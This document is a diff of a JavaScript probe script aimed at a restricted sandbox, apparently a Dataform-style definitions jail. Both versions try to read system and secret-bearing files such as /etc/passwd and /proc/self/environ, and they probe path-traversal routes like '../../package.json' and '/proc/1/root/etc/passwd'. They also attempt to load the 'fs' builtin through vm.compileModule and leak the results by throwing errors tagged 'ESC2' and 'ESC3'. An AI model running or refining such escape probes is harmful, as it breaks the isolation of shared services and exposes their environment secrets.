@@ -1,16 +1,15 @@
 var out = {};
-function S(x,n){ try { return String(x).slice(0,n||400); } catch(e){ return "?"; } }
-// A. file read via restricted_fs.readFile - try a set of paths
-var paths = ["/etc/passwd","/etc/hostname","/proc/self/cmdline","/proc/self/environ","/proc/version","/proc/mounts","/etc/os-release","/proc/self/cwd/package.json","/app/package.json","/workspace/package.json"];
-out.readFiles = {};
-paths.forEach(function(p){
-  try { out.readFiles[p] = S(restricted_fs.readFile(p), 300); } catch(e){ out.readFiles[p] = "ERR:"+S(e,120); }
-});
-// B. what does exists/isDirectory tell us
-out.exists = {};
-["/etc","/proc","/proc/self","/app","/workspace","/usr/bin","/bin"].forEach(function(p){
-  try { out.exists[p] = String(restricted_fs.exists(p)); } catch(e){ out.exists[p]="ERR"; }
-});
-// C. vm.compileModule signature
-out.vm_compile_str = S(vm.compileModule, 400);
-throw new Error("ESC2::" + JSON.stringify(out));
+function S(x,n){ try { return String(x).slice(0,n||300); } catch(e){ return "?"; } }
+// A. what paths exist in the jail?
+var cands = ["/","/definitions","definitions","/definitions/exec.js","exec.js","package.json","/package.json",
+  "./package.json","../package.json","../../package.json","/../package.json","/definitions/../package.json",
+  "/definitions/../../package.json","dataform.json","/node_modules","node_modules","/node_modules/@dataform/core/package.json",
+  "node_modules/@dataform/core/package.json","/tmp","/root","/home","/proc/1/root/etc/passwd"];
+out.probe = {};
+cands.forEach(function(p){ try { out.probe[p] = "E:"+String(restricted_fs.exists(p)); } catch(e){ out.probe[p]="X:"+S(e,60); } });
+// B. read package.json (we know it exists in the repo)
+try { out.pkg = S(restricted_fs.readFile("package.json"), 200); } catch(e){ out.pkg="ERR:"+S(e,120); }
+try { out.pkg_slash = S(restricted_fs.readFile("/package.json"), 200); } catch(e){ out.pkg_slash="ERR:"+S(e,120); }
+// C. can compileModule load a builtin?
+try { out.cm_fs = S(vm.compileModule,80); var m = vm.compileModule("fs"); out.cm_fs_ret = S(m,150); } catch(e){ out.cm_fs_err = S(e,200); }
+throw new Error("ESC3::" + JSON.stringify(out));
